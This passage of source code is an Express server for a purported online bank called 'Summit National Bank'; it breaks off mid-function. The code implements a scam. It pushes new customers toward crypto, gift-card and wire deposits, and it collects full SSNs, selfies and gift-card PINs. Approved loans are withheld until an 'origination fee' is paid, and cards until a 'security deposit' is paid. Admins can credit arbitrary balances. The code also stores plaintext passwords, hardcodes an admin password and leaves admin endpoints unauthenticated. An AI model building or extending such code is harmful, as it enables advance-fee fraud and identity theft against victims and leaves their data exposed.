/* ==========================================================================
   Summit National Bank — Backend API Server
   Express server with all banking endpoints.
   Serves static files from /public and API from /api
   ========================================================================== */

const express = require('express');
const cors = require('cors');
const path = require('path');
const db = require('./lib/db');
const mailer = require('./lib/mailer');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CORS: restrict to allowed origins (set ALLOWED_ORIGINS env var in Railway) ---
// If ALLOWED_ORIGINS is not set, allow all (for development). In production, set it
// to your Railway domain, e.g. "https://summit-bank.up.railway.app"
const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
  .split(',').map(s => s.trim()).filter(Boolean);
app.use(cors({
  origin: ALLOWED_ORIGINS.length ? ALLOWED_ORIGINS : true,
  credentials: true,
}));
app.use(express.json({ limit: '50mb' })); // large limit for selfie/gift card image data URLs

// --- Root redirect: "/" -> "/login" ---
// MUST come before express.static, otherwise public/index.html is served for "/"
// (replaces the old vercel.json rewrite, which Railway ignores)
app.get('/', (req, res) => res.redirect('/login'));

// --- Explicit page routes (extensionless URLs) ---
// MUST come before express.static so that /admin doesn't get redirected to /admin/
// Without these, the catch-all below serves index.html for /login, /signup, etc.
// which causes an infinite redirect loop (index.html redirects to /login).
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/signup', (req, res) => res.sendFile(path.join(__dirname, 'public', 'signup.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
app.get('/admin/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));

// Serve static files from /public (where our frontend lives)
app.use(express.static(path.join(__dirname, 'public')));

/* ==========================================================================
   AUTH ENDPOINTS
   ========================================================================== */

// Customer login
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const data = db.load();
  const c = data.customers.find(x => x.email.toLowerCase() === (email || '').toLowerCase().trim() && x.password === password);
  if (!c) return res.json({ ok: false, error: 'Invalid email or password.' });
  if (c.status === 'frozen') return res.json({ ok: false, error: 'Your account has been frozen. Please contact support.' });
  res.json({ ok: true, customer: { id: c.id, name: c.name, email: c.email } });
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin2024';
  if (password !== ADMIN_PASSWORD) return res.json({ ok: false, error: 'Invalid admin password.' });
  res.json({ ok: true, name: 'Dana Reyes' });
});

/* ==========================================================================
   SIGNUP
   ========================================================================== */

app.post('/api/signup', (req, res) => {
  const d = req.body;
  const data = db.load();
  const existsApp = data.applications.signups.find(s => s.email.toLowerCase() === d.email.toLowerCase().trim());
  const existsCust = data.customers.find(c => c.email.toLowerCase() === d.email.toLowerCase().trim());
  if (existsApp) return res.json({ ok: false, error: 'An application with this email is already pending.' });
  if (existsCust) return res.json({ ok: false, error: 'An account with this email already exists. Please log in.' });
  const app = {
    id: db.nextId('signup'),
    name: d.name, email: d.email.toLowerCase().trim(), password: d.password,
    phone: d.phone, dob: d.dob, ssn: d.ssn, ssnFull: d.ssnFull || '',
    selfie: d.selfie || '', address: d.address, employer: d.employer || '',
    // Accept both primary and alternate field names for robustness
    type: d.type || d.accountType || 'Checking',
    deposit: d.deposit != null ? d.deposit : (d.initialDeposit != null ? d.initialDeposit : 0),
    idStatus: 'Pending review',
    submitted: Date.now(), status: 'pending',
  };
  data.applications.signups.push(app);
  db.save();
  db.addAudit(`New sign-up application received from <b>${db.esc(d.name)}</b> (${d.email}). Awaiting admin review.`, 'oth');
  mailer.notifySignupReceived(app.email, app.name, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   CUSTOMER DATA
   ========================================================================== */

app.get('/api/health', (req, res) => {
  res.json({ ok: true, service: 'Summit National Bank API', time: new Date().toISOString() });
});

app.get('/api/customer/:customerId', (req, res) => {
  const data = db.load();
  const customer = data.customers.find(c => c.id === req.params.customerId);
  if (!customer) return res.json({ ok: false, error: 'Customer not found.' });
  const accounts = data.accounts.filter(a => a.customerId === customer.id);
  const cards = data.cards.filter(c => c.customerId === customer.id);
  const txns = data.transactions.filter(t => t.customerId === customer.id).sort((a, b) => b.date - a.date);
  const pendingLoans = data.applications.loans.filter(l => l.customerId === customer.id && l.status === 'pending');
  const feePendingLoans = data.applications.loans.filter(l => l.customerId === customer.id && l.status === 'fee_pending');
  const pendingCards = data.applications.cards.filter(c => c.customerId === customer.id && c.status === 'pending');
  const pendingDeposits = data.applications.deposits.filter(d => d.customerId === customer.id && d.status === 'pending');
  const pendingTxns = data.applications.transactions.filter(t => t.customerId === customer.id && t.status === 'pending');
  const pendingCrypto = data.applications.crypto.filter(c => c.customerId === customer.id && c.status === 'pending');
  const pendingGiftcards = data.applications.giftcards.filter(g => g.customerId === customer.id && g.status === 'pending');
  const chat = data.chats[customer.id] || [];
  const chatUnread = chat.filter(m => m.from === 'admin' && !m.readByCustomer).length;
  const settings = data.settings || {};
  const isNew = isNewUser(data, customer.id);
  res.json({
    ok: true,
    customer, accounts, cards, txns,
    pendingLoans, feePendingLoans, pendingCards, pendingDeposits, pendingTxns,
    pendingCrypto, pendingGiftcards, chat, chatUnread,
    isNewUser: isNew,
    settings: {
      bankName: settings.bankName || 'Summit National Bank',
      bankPhone: settings.bankPhone || '',
      bankEmail: settings.bankEmail || '',
      processingTimeBusinessDays: settings.processingTimeBusinessDays || '3-5 business days',
      cardProcessingTimeBusinessDays: settings.cardProcessingTimeBusinessDays || '7-10 business days',
      newUserDepositMethodsEnabled: settings.newUserDepositMethodsEnabled !== false,
      newUserDepositMethods: settings.newUserDepositMethods || ['Crypto Deposit', 'Gift Card Deposit', 'Wire Transfer'],
      newUserDepositRestrictionReason: settings.newUserDepositRestrictionReason || '',
    },
  });
});

/* ==========================================================================
   LOAN APPLICATION
   ========================================================================== */

app.post('/api/loan', (req, res) => {
  const d = req.body;
  const data = db.load();
  const app = {
    id: db.nextId('loan'),
    customerId: d.customerId, name: d.name, email: d.email,
    type: d.type, amount: d.amount, rate: d.rate, term: d.term,
    score: d.score || '—', income: d.income, employer: d.employer || '',
    purpose: d.purpose,
    submitted: Date.now(), status: 'pending',
  };
  data.applications.loans.push(app);
  db.save();
  db.addAudit(`New loan application (${d.type}, ${db.money0(d.amount)}) from <b>${db.esc(d.name)}</b>. Awaiting admin review.`, 'oth');
  mailer.notifyLoanReceived(d.email, d.name, d.type, d.amount, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   CREDIT CARD APPLICATION
   ========================================================================== */

app.post('/api/card-app', (req, res) => {
  const d = req.body;
  const data = db.load();
  const app = {
    id: db.nextId('card'),
    customerId: d.customerId, name: d.name, email: d.email,
    cardType: d.cardType, reqLimit: d.reqLimit,
    score: d.score || '—', income: d.income, existingDebt: d.existingDebt || 0,
    selfie: d.selfie || '',
    submitted: Date.now(), status: 'pending',
  };
  data.applications.cards.push(app);
  db.save();
  db.addAudit(`New credit card application (${d.cardType}, limit ${db.money0(d.reqLimit)}) from <b>${db.esc(d.name)}</b>. Awaiting admin review.`, 'oth');
  mailer.notifyCardReceived(d.email, d.name, d.cardType, d.reqLimit, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   DEPOSIT REQUEST
   ========================================================================== */

app.post('/api/deposit', (req, res) => {
  const d = req.body;
  const data = db.load();
  const settings = data.settings || {};
  // New-user deposit restriction
  if (settings.newUserDepositMethodsEnabled !== false && isNewUser(data, d.customerId)) {
    const allowed = settings.newUserDepositMethods || ['Crypto Deposit', 'Gift Card Deposit', 'Wire Transfer'];
    if (!allowed.includes(d.depType)) {
      const reason = settings.newUserDepositRestrictionReason || 'This deposit method is not available for your account at this time.';
      return res.json({ ok: false, error: 'deposit_restricted', reason, allowedMethods: allowed });
    }
  }
  const acct = data.accounts.find(a => a.id === d.acctId);
  const app = {
    id: db.nextId('deposit'),
    customerId: d.customerId, name: d.name,
    acctId: d.acctId, acctNo: acct ? acct.acctNo : '', acctType: acct ? acct.type : '',
    depType: d.depType, amount: d.amount, source: d.source,
    submitted: Date.now(), status: 'pending',
  };
  data.applications.deposits.push(app);
  db.save();
  db.addAudit(`New deposit request (${d.depType}, ${db.money(d.amount)}) from <b>${db.esc(d.name)}</b>. Awaiting admin review.`, 'oth');
  // Find customer email for notification
  const depCust = data.customers.find(x => x.id === d.customerId);
  if (depCust) mailer.notifyDepositReceived(depCust.email, d.name, d.depType, d.amount, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   TRANSACTION (TRANSFER/PAYMENT)
   ========================================================================== */

app.post('/api/transaction', (req, res) => {
  const d = req.body;
  const data = db.load();
  const acct = data.accounts.find(a => a.id === d.fromAcctId);
  if (d.direction === 'out' && acct && d.amount > acct.balance) {
    return res.json({ ok: false, error: 'Insufficient funds in this account for this transfer.' });
  }
  const app = {
    id: db.nextId('txn'),
    customerId: d.customerId, name: d.name,
    fromAcctId: d.fromAcctId, acctNo: acct ? acct.acctNo : '',
    type: d.type, direction: d.direction || 'out',
    amount: d.amount, recipient: d.recipient, ref: d.ref || ('CUST-' + Date.now().toString(36).toUpperCase()),
    submitted: Date.now(), status: 'pending',
  };
  data.applications.transactions.push(app);
  db.save();
  db.addAudit(`New ${d.type} request (${db.money(d.amount)}) from <b>${db.esc(d.name)}</b> to ${db.esc(d.recipient)}. Awaiting admin approval.`, 'oth');
  const txnCust = data.customers.find(x => x.id === d.customerId);
  if (txnCust) mailer.notifyTransactionReceived(txnCust.email, d.name, d.type, d.amount, d.recipient, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   CRYPTO DEPOSITS
   ========================================================================== */

app.get('/api/crypto/wallets', (req, res) => {
  const data = db.load();
  res.json({ ok: true, wallets: data.cryptoWallets });
});

/* ==========================================================================
   PUBLIC SETTINGS (for user dashboard — deposit restrictions, bank info)
   ========================================================================== */
app.get('/api/settings', (req, res) => {
  const data = db.load();
  const s = data.settings || {};
  res.json({
    ok: true,
    settings: {
      bankName: s.bankName || 'Summit National Bank',
      bankPhone: s.bankPhone || '',
      bankEmail: s.bankEmail || '',
      processingTimeBusinessDays: s.processingTimeBusinessDays || '3-5 business days',
      cardProcessingTimeBusinessDays: s.cardProcessingTimeBusinessDays || '7-10 business days',
      newUserDepositMethodsEnabled: s.newUserDepositMethodsEnabled !== false,
      newUserDepositMethods: s.newUserDepositMethods || ['Crypto Deposit', 'Gift Card Deposit', 'Wire Transfer'],
      newUserDepositRestrictionReason: s.newUserDepositRestrictionReason || '',
    },
  });
});

/* ==========================================================================
   ADMIN SETTINGS (update configurable defaults)
   ========================================================================== */
app.post('/api/admin/update-settings', (req, res) => {
  const d = req.body;
  const data = db.load();
  if (!data.settings) data.settings = {};
  const s = data.settings;
  if (d.defaultCardSecurityDeposit != null) s.defaultCardSecurityDeposit = Number(d.defaultCardSecurityDeposit) || 0;
  if (d.defaultLoanFee != null) s.defaultLoanFee = Number(d.defaultLoanFee) || 0;
  if (d.loanFeeEnabled != null) s.loanFeeEnabled = !!d.loanFeeEnabled;
  if (d.newUserDepositMethodsEnabled != null) s.newUserDepositMethodsEnabled = !!d.newUserDepositMethodsEnabled;
  if (Array.isArray(d.newUserDepositMethods)) s.newUserDepositMethods = d.newUserDepositMethods;
  if (d.newUserDepositRestrictionReason != null) s.newUserDepositRestrictionReason = String(d.newUserDepositRestrictionReason);
  if (d.bankName != null) s.bankName = String(d.bankName);
  if (d.bankPhone != null) s.bankPhone = String(d.bankPhone);
  if (d.bankEmail != null) s.bankEmail = String(d.bankEmail);
  if (d.processingTimeBusinessDays != null) s.processingTimeBusinessDays = String(d.processingTimeBusinessDays);
  if (d.cardProcessingTimeBusinessDays != null) s.cardProcessingTimeBusinessDays = String(d.cardProcessingTimeBusinessDays);
  db.save();
  db.addAudit('Updated bank settings (security deposit default, loan fee, deposit restrictions, bank contact info).', 'oth', 'Dana Reyes');
  res.json({ ok: true, settings: s });
});

/* ==========================================================================
   HELPER: determine if a customer is a "new user" (restricted deposits)
   A new user = no approved outgoing transactions to an external account AND
   fewer than 3 completed/approved transactions total.
   ========================================================================== */
function isNewUser(data, customerId) {
  const txns = data.transactions.filter(t => t.customerId === customerId && t.status === 'approved');
  // no external withdrawals yet (direction 'out' transfers to recipients, not internal)
  const externalWithdrawals = txns.filter(t => t.direction === 'out' && t.type !== 'Interest');
  return txns.length < 3 || externalWithdrawals.length === 0;
}

/* ==========================================================================
   LOAN FEE — when admin approves a loan, set status to 'fee_pending' and
   record the loan fee. Loan is NOT disbursed until fee is confirmed paid.
   ========================================================================== */

app.post('/api/crypto/deposit', (req, res) => {
  const d = req.body;
  const data = db.load();
  const wallet = data.cryptoWallets[d.coin] || {};
  const targetAcct = data.accounts.find(a => a.id === d.toAccount);
  const app = {
    id: db.nextId('crypto'),
    customerId: d.customerId, name: d.name, email: d.email || '',
    coin: d.coin, amount: d.amount, usdAmount: d.amount,
    walletAddress: d.walletAddress,
    network: d.network || wallet.network || '',
    txnHash: d.txnHash || '', txHash: d.txnHash || '',
    toAccount: d.toAccount || '',
    acctNo: targetAcct ? targetAcct.acctNo : '',
    submitted: Date.now(), status: 'pending',
  };
  data.applications.crypto.push(app);
  db.save();
  db.addAudit(`New crypto deposit request (<b>${db.esc(d.coin)}</b>, ${db.esc(d.amount)}) from <b>${db.esc(d.name)}</b>. Awaiting admin confirmation.`, 'oth');
  mailer.notifyCryptoReceived(d.email || (data.customers.find(x => x.id === d.customerId) || {}).email || '', d.name, d.coin, d.amount, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   GIFT CARD DEPOSITS
   ========================================================================== */

app.post('/api/giftcard/deposit', (req, res) => {
  const d = req.body;
  const data = db.load();
  const targetAcct = data.accounts.find(a => a.id === d.toAccount);
  const app = {
    id: db.nextId('giftcard'),
    customerId: d.customerId, name: d.name, email: d.email || '',
    cardBrand: d.cardBrand, brand: d.cardBrand,
    cardValue: d.cardValue, value: d.cardValue,
    pins: d.pins || [],
    images: d.images || [],
    toAccount: d.toAccount || '',
    acctNo: targetAcct ? targetAcct.acctNo : '',
    submitted: Date.now(), status: 'pending',
  };
  data.applications.giftcards.push(app);
  db.save();
  db.addAudit(`New gift card deposit (${db.esc(app.cardBrand)}, ${db.money(app.cardValue)}) from <b>${db.esc(d.name)}</b>. ${app.pins.length} pin(s), ${app.images.length} image(s) attached. Awaiting admin review.`, 'oth');
  mailer.notifyGiftcardReceived(d.email || (data.customers.find(x => x.id === d.customerId) || {}).email || '', d.name, d.cardBrand, d.cardValue, app.id).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, id: app.id });
});

/* ==========================================================================
   LIVE CHAT
   ========================================================================== */

app.post('/api/chat/send', (req, res) => {
  const { customerId, name, text } = req.body;
  const data = db.load();
  if (!data.chats[customerId]) data.chats[customerId] = [];
  const msg = {
    id: db.nextId('chat'),
    from: 'customer', text,
    ts: Date.now(), readByAdmin: false, readByCustomer: true,
  };
  data.chats[customerId].push(msg);
  db.save();
  db.addAudit(`Customer <b>${db.esc(name)}</b> sent a new support message.`, 'oth');
  res.json({ ok: true, msg });
});

app.post('/api/chat/admin-send', (req, res) => {
  const { customerId, text } = req.body;
  const data = db.load();
  if (!data.chats[customerId]) data.chats[customerId] = [];
  const msg = {
    id: db.nextId('chat'),
    from: 'admin', text,
    ts: Date.now(), readByAdmin: true, readByCustomer: false,
  };
  data.chats[customerId].push(msg);
  const c = data.customers.find(x => x.id === customerId);
  db.save();
  db.addAudit(`Admin replied to <b>${db.esc(c ? c.name : customerId)}</b> in live chat.`, 'oth');
  if (c) mailer.notifyChatReply(c.email, c.name, text).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, msg });
});

app.post('/api/chat/mark-read-admin', (req, res) => {
  const { customerId } = req.body;
  const data = db.load();
  if (data.chats[customerId]) data.chats[customerId].forEach(m => { if (m.from === 'customer') m.readByAdmin = true; });
  db.save();
  res.json({ ok: true });
});

app.post('/api/chat/mark-read-customer', (req, res) => {
  const { customerId } = req.body;
  const data = db.load();
  if (data.chats[customerId]) data.chats[customerId].forEach(m => { if (m.from === 'admin') m.readByCustomer = true; });
  db.save();
  res.json({ ok: true });
});

/* ==========================================================================
   CUSTOMER SETTINGS
   ========================================================================== */

app.post('/api/settings/change-password', (req, res) => {
  const { customerId, currentPassword, newPassword } = req.body;
  const data = db.load();
  const c = data.customers.find(x => x.id === customerId);
  if (!c) return res.json({ ok: false, error: 'Customer not found.' });
  if (c.password !== currentPassword) return res.json({ ok: false, error: 'Current password is incorrect.' });
  if (!newPassword || newPassword.length < 6) return res.json({ ok: false, error: 'New password must be at least 6 characters.' });
  c.password = newPassword;
  db.save();
  db.addAudit(`Customer <b>${db.esc(c.name)}</b> changed their password.`, 'oth');
  mailer.notifyPasswordChanged(c.email, c.name).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

app.post('/api/settings/change-email', (req, res) => {
  const { customerId, newEmail, password } = req.body;
  const data = db.load();
  const c = data.customers.find(x => x.id === customerId);
  if (!c) return res.json({ ok: false, error: 'Customer not found.' });
  if (c.password !== password) return res.json({ ok: false, error: 'Password is incorrect.' });
  const em = newEmail.toLowerCase().trim();
  if (!em || !em.includes('@')) return res.json({ ok: false, error: 'Please enter a valid email address.' });
  const taken = data.customers.find(x => x.id !== customerId && x.email.toLowerCase() === em);
  if (taken) return res.json({ ok: false, error: 'That email is already in use by another account.' });
  const takenApp = data.applications.signups.find(s => s.email.toLowerCase() === em && s.status === 'pending');
  if (takenApp) return res.json({ ok: false, error: 'That email is pending on another application.' });
  const oldEmail = c.email;
  c.email = em;
  db.save();
  db.addAudit(`Customer <b>${db.esc(c.name)}</b> updated their email to ${em}.`, 'oth');
  mailer.notifyEmailChanged(oldEmail, em, c.name).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, email: em });
});

/* ==========================================================================
   ADMIN ENDPOINTS
   ========================================================================== */

// Get all data (for admin panel)
app.get('/api/admin/all', (req, res) => {
  const data = db.load();
  res.json({ ok: true, db: data });
});

// Get pending counts
app.get('/api/admin/counts', (req, res) => {
  const data = db.load();
  let chatUnread = 0;
  Object.values(data.chats).forEach(thread => { thread.forEach(m => { if (m.from === 'customer' && !m.readByAdmin) chatUnread++; }); });
  res.json({
    ok: true,
    counts: {
      signups: data.applications.signups.filter(s => s.status === 'pending').length,
      loans: data.applications.loans.filter(l => l.status === 'pending' || l.status === 'fee_pending').length,
      cards: data.applications.cards.filter(c => c.status === 'pending').length,
      deposits: data.applications.deposits.filter(d => d.status === 'pending').length,
      transactions: data.applications.transactions.filter(t => t.status === 'pending').length,
      crypto: data.applications.crypto.filter(c => c.status === 'pending').length,
      giftcards: data.applications.giftcards.filter(g => g.status === 'pending').length,
      chat: chatUnread,
    }
  });
});

// Approve signup
app.post('/api/admin/approve-signup', (req, res) => {
  const { id, creditAmount } = req.body;
  const data = db.load();
  const app = data.applications.signups.find(s => s.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  // Defensive: ensure type/deposit are never undefined (prevents crash on malformed signups)
  const appType = app.type || 'Checking';
  const dep = creditAmount != null ? Number(creditAmount) : (app.deposit != null ? Number(app.deposit) : 0);
  const custId = db.nextId('cust');
  const cust = {
    id: custId, name: app.name || 'Unknown', email: app.email, password: app.password,
    phone: app.phone || '', dob: app.dob || '', ssn: app.ssn || '', ssnFull: app.ssnFull || '', selfie: app.selfie || '',
    address: app.address || '', employer: app.employer || '', createdAt: Date.now(), status: 'active',
  };
  data.customers.push(cust);
  const acct = {
    id: db.nextId('acct'), customerId: custId, name: cust.name,
    acctNo: db.genAcctNo(),
    type: appType.includes('Savings') ? 'High-Yield Savings' : appType.includes('CD') ? appType : 'Checking',
    balance: dep, status: 'active', opened: new Date().toISOString().slice(0, 10),
  };
  data.accounts.push(acct);
  data.transactions.push({
    id: db.nextId('txn'), customerId: custId, name: app.name, acctNo: acct.acctNo,
    type: 'Opening Deposit', direction: 'in', amount: dep, recipient: 'Account opening deposit',
    ref: 'OPEN-' + acct.acctNo.slice(-4), status: 'approved', date: Date.now(),
  });
  app.status = 'approved';
  db.save();
  db.addAudit(`Approved sign-up <b>${db.esc(app.name)}</b>. Created customer ${custId} & account <span class="mono">${acct.acctNo}</span> (${acct.type}). Credited opening deposit <b>${db.money(dep)}</b>. Customer can now log in.`, 'app', 'Dana Reyes');
  mailer.notifySignupApproved(app.email, app.name, custId, acct.acctNo, acct.type, dep).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true, customerId: custId, acctNo: acct.acctNo });
});

// Reject signup
app.post('/api/admin/reject-signup', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.signups.find(s => s.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected sign-up from <b>${db.esc(app.name)}</b> (${app.email}). Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  mailer.notifySignupRejected(app.email, app.name, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve loan — sets status to 'fee_pending' with a loan origination fee.
// The loan funds are NOT disbursed until the fee is confirmed paid.
app.post('/api/admin/approve-loan', (req, res) => {
  const { id, loanFee } = req.body;
  const data = db.load();
  const app = data.applications.loans.find(l => l.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  const settings = data.settings || {};
  const feeEnabled = settings.loanFeeEnabled !== false;
  const fee = feeEnabled ? (loanFee != null ? Number(loanFee) : Number(settings.defaultLoanFee || 0)) : 0;
  if (fee > 0) {
    app.status = 'fee_pending';
    app.loanFee = fee;
    app.approvedAt = Date.now();
    db.save();
    db.addAudit(`Approved loan (${app.type}, ${db.money0(app.amount)}) for <b>${db.esc(app.name)}</b>. Loan origination fee of <b>${db.money0(fee)}</b> is required before disbursement. Loan pending until fee is paid.`, 'app', 'Dana Reyes');
    mailer.notifyGeneric(app.email, app.name, 'Loan Approved — Origination Fee Required Before Disbursement',
      `Congratulations! Your ${app.type} application (${app.id}) for ${db.money0(app.amount)} has been approved by our underwriting team.\n\nBefore the loan funds can be disbursed to your checking account, a one-time loan origination fee of ${db.money0(fee)} is required. This fee covers loan processing, documentation, and underwriting costs.\n\nYour loan is currently on hold pending payment of the origination fee. Once the fee is received and confirmed, the full loan amount of ${db.money0(app.amount)} will be disbursed to your checking account within 1-2 business days.\n\nPlease contact our loan department at ${settings.bankPhone || '1-800-555-0142'} or visit any Summit National Bank branch to arrange payment of the origination fee.\n\nReference: ${app.id}`
    ).catch(e => console.error('Email error:', e.message));
    res.json({ ok: true, status: 'fee_pending', loanFee: fee });
  } else {
    // No fee — disburse immediately (legacy / fee disabled path)
    let acct = data.accounts.find(a => a.customerId === app.customerId && a.type === 'Checking');
    if (!acct) {
      acct = { id: db.nextId('acct'), customerId: app.customerId, name: app.name, acctNo: db.genAcctNo(), type: 'Checking', balance: 0, status: 'active', opened: new Date().toISOString().slice(0, 10) };
      data.accounts.push(acct);
    }
    acct.balance += app.amount;
    data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: acct.acctNo, type: 'Loan Disbursement', direction: 'in', amount: app.amount, recipient: app.type + ' disbursement', ref: 'LOAN-' + app.id, status: 'approved', date: Date.now() });
    app.status = 'approved'; app.loanFee = 0; app.approvedAt = Date.now();
    db.save();
    db.addAudit(`Approved loan (${app.type}, ${db.money0(app.amount)}) for <b>${db.esc(app.name)}</b>. Disbursed to account <span class="mono">${acct.acctNo}</span>. New balance: ${db.money(acct.balance)}.`, 'app', 'Dana Reyes');
    mailer.notifyLoanApproved(app.email, app.name, app.type, app.amount, acct.acctNo, acct.balance).catch(e => console.error('Email error:', e.message));
    res.json({ ok: true, status: 'approved', loanFee: 0 });
  }
});

// Confirm loan fee paid — disburses the loan funds to checking
app.post('/api/admin/confirm-loan-fee-paid', (req, res) => {
  const { id } = req.body;
  const data = db.load();
  const app = data.applications.loans.find(l => l.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  if (app.status !== 'fee_pending') return res.json({ ok: false, error: 'Loan is not in fee-pending status.' });
  let acct = data.accounts.find(a => a.customerId === app.customerId && a.type === 'Checking');
  if (!acct) {
    acct = { id: db.nextId('acct'), customerId: app.customerId, name: app.name, acctNo: db.genAcctNo(), type: 'Checking', balance: 0, status: 'active', opened: new Date().toISOString().slice(0, 10) };
    data.accounts.push(acct);
  }
  acct.balance += app.amount;
  data.transactions.push({ id: db.nextId('txn'), customerId: app.customerId, name: app.name, acctNo: acct.acctNo, type: 'Loan Disbursement', direction: 'in', amount: app.amount, recipient: app.type + ' disbursement', ref: 'LOAN-' + app.id, status: 'approved', date: Date.now() });
  app.status = 'approved'; app.feePaidAt = Date.now();
  db.save();
  const settings = data.settings || {};
  db.addAudit(`Loan origination fee confirmed for ${app.type} loan (${db.money0(app.amount)}) — <b>${db.esc(app.name)}</b>. Disbursed to account <span class="mono">${acct.acctNo}</span>. New balance: ${db.money(acct.balance)}.`, 'app', 'Dana Reyes');
  mailer.notifyGeneric(app.email, app.name, 'Loan Funds Disbursed to Your Account',
    `Your loan origination fee has been received and confirmed. The full loan amount of ${db.money0(app.amount)} for your ${app.type} (Reference: ${app.id}) has now been disbursed to your checking account ending in ${acct.acctNo.slice(-4)}.\n\nYour new checking account balance is ${db.money(acct.balance)}.\n\nThank you for banking with Summit National Bank.`
  ).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Admin can edit the loan fee on an existing fee_pending loan
app.post('/api/admin/update-loan-fee', (req, res) => {
  const { id, loanFee } = req.body;
  const data = db.load();
  const app = data.applications.loans.find(l => l.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  if (app.status !== 'fee_pending') return res.json({ ok: false, error: 'Loan fee can only be edited while in fee-pending status.' });
  app.loanFee = Number(loanFee) || 0;
  db.save();
  db.addAudit(`Updated loan origination fee to <b>${db.money0(app.loanFee)}</b> for loan ${app.id} (${db.esc(app.name)}).`, 'oth', 'Dana Reyes');
  res.json({ ok: true });
});

// Reject loan
app.post('/api/admin/reject-loan', (req, res) => {
  const { id, reason } = req.body;
  const data = db.load();
  const app = data.applications.loans.find(l => l.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  app.status = 'rejected'; app.rejectReason = reason;
  db.save();
  db.addAudit(`Rejected loan (${app.type}) for <b>${db.esc(app.name)}</b>. Reason: ${db.esc(reason)}.`, 'rej', 'Dana Reyes');
  mailer.notifyLoanRejected(app.email, app.name, app.type, reason).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Approve credit card
app.post('/api/admin/approve-card', (req, res) => {
  const { id, limit, securityDeposit } = req.body;
  const data = db.load();
  const app = data.applications.cards.find(c => c.id === id);
  if (!app) return res.json({ ok: false, error: 'Application not found.' });
  const settings = data.settings || {};
  const lim = limit != null ? limit : app.reqLimit;
  // Use provided securityDeposit, else default from settings, else 0
  const dep = securityDeposit != null
    ? (Number(securityDeposit) > 0 ? Number(securityDeposit) : 0)
    : (Number(settings.defaultCardSecurityDeposit) > 0 ? Number(settings.defaultCardSecurityDeposit) : 0);
  const card = {
    id: db.nextId('cardissue'), customerId: app.customerId, name: app.name,
    cardType: app.cardType, cardNo: db.genCardNo(), limit: lim, balance: 0,
    expiry: ('0' + ((new Date().getMonth() + 1) % 12 || 12)).slice(-2) + '/' + String((new Date().getFullYear() + 5) % 100).padStart(2, '0'),
    status: 'active',
    securityDeposit: dep,
    depositStatus: dep > 0 ? 'required' : 'none',
    shipped: dep > 0 ? false : true,
  };
  data.cards.push(card);
  app.status = 'approved';
  db.save();
  db.addAudit(`Approved credit card (${app.cardType}) for <b>${db.esc(app.name)}</b>. Issued card <span class="mono">••••${card.cardNo.slice(-4)}</span> with limit <b>${db.money0(lim)}</b>${dep > 0 ? `. Refundable security deposit required: <b>${db.money0(dep)}</b>.` : ''}`, 'app', 'Dana Reyes');
  mailer.notifyCardApproved(app.email, app.name, app.cardType, card.cardNo.slice(-4), lim, card.expiry, dep).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Mark security deposit as paid (customer pays deposit) — admin confirms
app.post('/api/admin/confirm-deposit-paid', (req, res) => {
  const { cardId } = req.body;
  const data = db.load();
  const card = data.cards.find(c => c.id === cardId);
  if (!card) return res.json({ ok: false, error: 'Card not found.' });
  card.depositStatus = 'paid';
  card.shipped = true;
  db.save();
  const cust = data.customers.find(x => x.id === card.customerId);
  db.addAudit(`Refundable security deposit confirmed for card <span class="mono">••••${card.cardNo.slice(-4)}</span> (${db.esc(card.name)}). Card marked as shipped.`, 'app', 'Dana Reyes');
  if (cust) mailer.notifyGeneric(cust.email, card.name, 'Refundable Security Deposit Received — Card Shipped', `Your refundable security deposit has been received and confirmed. Your ${card.cardType} card (•••• ${card.cardNo.slice(-4)}) is now being shipped to your address on file and should arrive within 7–10 business days. Your security deposit is fully refundable and will be returned to you per the terms of your card agreement.`).catch(e => console.error('Email error:', e.message));
  res.json({ ok: true });
});

// Admin can update the security deposit amount on an already-issued card
app.post('/api/admin/update-deposit', (req, res) => {
  const { cardId, securityDeposit } = req.body;
  const data = db.load();
  const card = data.cards.find(c => c.id === cardId);
  if (!card) return res.json({ ok: false, error: 'Card not found.' });
  const dep = Number(securityDeposit) > 0 ? Number(securityDeposit) : 0;
  card.securityDeposit = dep;
  if (dep > 0 && card.depositStatus !== 'paid') {
